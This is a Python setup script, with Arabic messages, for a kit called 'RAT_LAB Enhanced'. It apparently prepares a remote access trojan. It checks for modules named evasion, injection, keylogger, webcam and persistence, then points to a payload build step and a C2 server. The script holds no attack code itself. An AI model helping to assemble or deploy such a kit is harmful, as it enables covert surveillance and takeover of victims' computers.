#!/usr/bin/env python3
# RAT_LAB Enhanced Setup

import os
import sys
import subprocess
import platform

def check_python_version():
    """التحقق من إصدار Python"""
    version = sys.version_info
    if version.major < 3 or (version.major == 3 and version.minor < 8):
        print("❌ Python 3.8+ مطلوب")
        return False
    print(f"✅ Python {version.major}.{version.minor} ({version.micro})")
    return True

def install_requirements():
    """تثبيت المتطلبات"""
    print("\n[*] تثبيت المتطلبات...")
    
    req_file = "requirements_enhanced.txt"
    if not os.path.exists(req_file):
        print(f"❌ ملف المتطلبات غير موجود: {req_file}")
        return False
    
    try:
        # Try with --user flag first
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--user", "-r", req_file],
            capture_output=True, text=True, timeout=300
        )
        if result.returncode != 0:
            # Fallback without --user
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-r", req_file],
                capture_output=True, text=True, timeout=300
            )
        if result.returncode == 0:
            print("✅ تم تثبيت المتطلبات بنجاح")
            return True
        else:
            print(f"❌ فشل تثبيت المتطلبات:\n{result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        print("❌ انتهت مهلة التثبيت")
        return False
    except Exception as e:
        print(f"❌ خطأ في التثبيت: {e}")
        return False

def create_directories():
    """إنشاء المجلدات المطلوبة"""
    print("\n[*] إنشاء المجلدات...")
    
    directories = [
        "output",
        "build_temp",
        "logs",
        "modules"
    ]
    
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"✅ تم إنشاء: {directory}")
    
    return True

def verify_modules():
    """التحقق من وجود المودولات"""
    print("\n[*] التحقق من المودولات...")
    
    required_modules = [
        "evasion.py",
        "injection.py", 
        "keylogger.py",
        "screenshot.py",
        "webcam.py",
        "fileops.py",
        "persistence.py",
        "shell.py"
    ]
    
    missing_modules = []
    for module in required_modules:
        if not os.path.exists(f"modules/{module}"):
            missing_modules.append(module)
    
    if missing_modules:
        print(f"❌ المودولات المفقودة: {', '.join(missing_modules)}")
        return False
    
    print("✅ جميع المودولات موجودة")
    return True

def test_dependencies():
    """اختبارات التبعيات"""
    print("\n[*] اختبارات التبعيات...")
    
    tests = [
        ("customtkinter", "customtkinter"),
        ("psutil", "psutil"),
        ("PIL", "PIL"),
        ("Crypto", "Crypto"),
        ("requests", "requests"),
        ("keyboard", "keyboard"),
    ]
    
    missing = []
    for name, module in tests:
        try:
            __import__(module)
            print(f"✅ {name}")
        except ImportError:
            print(f"❌ {name}")
            missing.append(name)
    
    if missing:
        print(f"\n⚠️  بعض التبعيات غير مثبتة: {', '.join(missing)}")
        return False
    
    return True

def main():
    """الوظيفة الرئيسية"""
    print("RAT_LAB Enhanced Setup")
    print("=" * 30)
    
    # التحقق من إصدار Python
    if not check_python_version():
        return False
    
    # إنشاء المجلدات
    if not create_directories():
        return False
    
    # التحقق من المودولات
    if not verify_modules():
        return False
    
    # اختبارات التبعيات
    if not test_dependencies():
        print("\n⚠️  بعض التبعيات غير مثبتة، سيتم تثبيتها...")
        if not install_requirements():
            print("❌ فشل تثبيت المتطلبات")
            return False
    
    # اختبارات التبعيات بعد التثبيت
    if not test_dependencies():
        print("❌ لا تزال بعض التبعيات غير مثبتة")
        return False
    
    print("\n🎉 تم إعداد RAT_LAB بنجاح!")
    print("\nالخطوات التالية:")
    print("1. تعديل config_enhanced.py مع إعداداتك")
    print("2. تشغيل: python build_enhanced.py --host <IP> --port <PORT>")
    print("3. تشغيل: python c2_server.py")
    
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)